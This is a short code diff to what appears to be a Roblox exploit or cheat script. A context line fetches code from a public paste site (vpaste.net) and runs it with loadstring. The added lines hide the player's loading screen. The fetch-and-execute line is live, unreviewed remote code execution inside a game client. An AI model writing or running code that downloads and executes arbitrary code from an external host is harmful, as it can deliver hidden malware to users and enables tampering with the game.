@@ -298,3 +298,17 @@ print("Execute status: Success!")
 
 
 loadstring(game:HttpGet("http://vpaste.net/Jm3pJ"))()
+
+task.wait(0.1)
+
+local player = game.Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local loadingGui = playerGui:WaitForChild("Loading")
+
+-- If it's a ScreenGui, disable it
+if loadingGui:IsA("ScreenGui") then
+    loadingGui.Enabled = false
+else
+    -- If it's a Frame or other GuiObject
+    loadingGui.Visible = false
+end
